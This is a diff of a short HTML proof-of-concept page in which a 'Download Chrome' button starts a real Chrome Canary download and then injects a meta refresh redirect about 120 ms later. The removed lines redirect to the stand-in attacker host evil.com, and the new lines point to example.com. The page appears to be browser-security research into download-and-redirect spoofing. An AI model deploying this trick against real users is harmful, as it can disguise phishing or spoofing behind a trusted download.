@@ -1,31 +1,30 @@
 <!DOCTYPE html>
 <html>
 <head>
-<title>Download PoC</title>
+<title>Download + Meta Refresh</title>
 </head>
 
 <body>
 
-<a href="#" onclick="start()">Download Chrome</a>
+<button onclick="start()">Download Chrome</button>
 
 <script>
 function start() {
 
-    var w = window.open();
-    w.opener = null;
+    // create download link
+    var a = document.createElement("a");
+    a.href = "https://dl.google.com/chrome/mac/universal/canary/googlechromecanary.dmg";
+    a.download = "";
+    document.body.appendChild(a);
 
-    w.document.write(`
-        <a id="d" href="https://dl.google.com/chrome/mac/universal/canary/googlechromecanary.dmg">download</a>
-        <script>
-            document.getElementById("d").click();
-        <\/script>
-    `);
+    // trigger download
+    a.click();
 
-    // meta refresh shortly after
-    setTimeout(function () {
+    // meta refresh after short delay
+    setTimeout(function() {
         var meta = document.createElement("meta");
         meta.httpEquiv = "refresh";
-        meta.content = "0; url=https://evil.com";
+        meta.content = "0; url=https://example.com";
         document.head.appendChild(meta);
     }, 120);
 
